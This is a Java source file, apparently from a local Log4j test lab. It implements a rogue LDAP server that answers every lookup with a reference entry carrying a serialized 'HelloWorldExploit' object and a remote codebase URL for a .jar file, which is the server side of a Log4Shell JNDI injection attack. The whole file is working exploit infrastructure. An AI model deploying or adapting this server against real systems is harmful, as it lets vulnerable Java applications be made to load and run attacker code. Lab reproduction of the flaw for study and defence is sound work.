package com.example.log4jtest;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.net.InetAddress;
import java.time.LocalDateTime;
import java.util.Base64;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;

public class LdapServer {

  public static void main(String[] args) throws IOException {

    try {
      InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("dc=Test");
      int port = 9090;
      config.setListenerConfigs(new InMemoryListenerConfig(
          "listen", //$NON-NLS-1$
          InetAddress.getByName("127.0.0.1"), //$NON-NLS-1$
          port,
          ServerSocketFactory.getDefault(),
          SocketFactory.getDefault(),
          (SSLSocketFactory) SSLSocketFactory.getDefault()));

      config.addInMemoryOperationInterceptor(new OperationInterceptor());
      InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
      System.out.println(
          LocalDateTime.now() + " [LDAPSERVER] >> Listening on 0.0.0.0:" + port); //$NON-NLS-1$
      ds.startListening();

//      Hashtable<String, String> env = new Hashtable<>();
//      env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.ldap.LdapCtxFactory");
//      env.put(Context.PROVIDER_URL, "ldap://localhost:" + port + "/dc=Test");
//      DirContext ctx = new InitialDirContext(env);
//
//      // Добавление записи с HelloWorldExploit в директорию
//      Attributes attrs = new BasicAttributes(true);
//      attrs.put("objectClass", "javaNamingReference");
//      attrs.put("javaClassName", "HelloWorldExploit");
//      attrs.put("javaFactory", "HelloWorldExploit");
//      ctx.bind("cn=javaNamingReference", null, attrs);

    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  public static class OperationInterceptor extends InMemoryOperationInterceptor {


    @Override
    public void processSearchResult(InMemoryInterceptedSearchResult result) {
      Entry e = new Entry("");

      HelloWorldExploit helloWorldExploit = new HelloWorldExploit();
      ByteArrayOutputStream bos = new ByteArrayOutputStream();
      try (ObjectOutputStream o = new ObjectOutputStream(bos);) {
        o.writeObject(helloWorldExploit);
      } catch (IOException ex) {
        throw new RuntimeException(ex);
      }
      e.addAttribute("javaClassName", "HelloWorldExploit");
      e.addAttribute("javaCodeBase", "http://127.0.0.1:9191/HelloWorldExploit.jar");
      e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
      e.addAttribute("javaSerializedData", bos.toByteArray()); //$NON-NLS-1$
//      e.addAttribute("javaSerializedData", "��\u0000\u0005sr\u0000'com.example.log4jtest.HelloWorldExploit(dl'\\N؞\u0002\u0000\u0000xp"); //$NON-NLS-1$
      try {
        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
      } catch (LDAPException ex) {
        throw new RuntimeException(ex);
      }
    }
  }
}
